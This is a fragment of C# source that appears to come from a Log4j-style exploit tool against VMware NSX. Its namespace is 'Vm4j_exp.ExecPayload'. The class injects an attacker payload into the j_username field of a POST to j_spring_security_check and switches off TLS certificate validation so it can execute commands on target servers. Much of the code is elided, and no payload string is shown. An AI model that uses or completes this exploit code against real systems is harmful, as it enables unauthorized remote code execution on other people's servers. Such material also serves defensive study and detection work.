...
namespace Vm4j_exp.ExecPayload
{
    class VNSX
    {
        ...
        public static string VNSXEcho(string url, string cmd, string payload)
        {
            ...
            Log log = new Log();
            string postdata = "j_username=" + payload + "&j_password=vm4j&submit-btn=vm4j";
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url.EndsWith("/") ? url + "j_spring_security_check" : url + "/j_spring_security_check");
#if DEBUG
        ...
        public static string VNSXExec(string url, string payload)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.Expect100Continue = false;
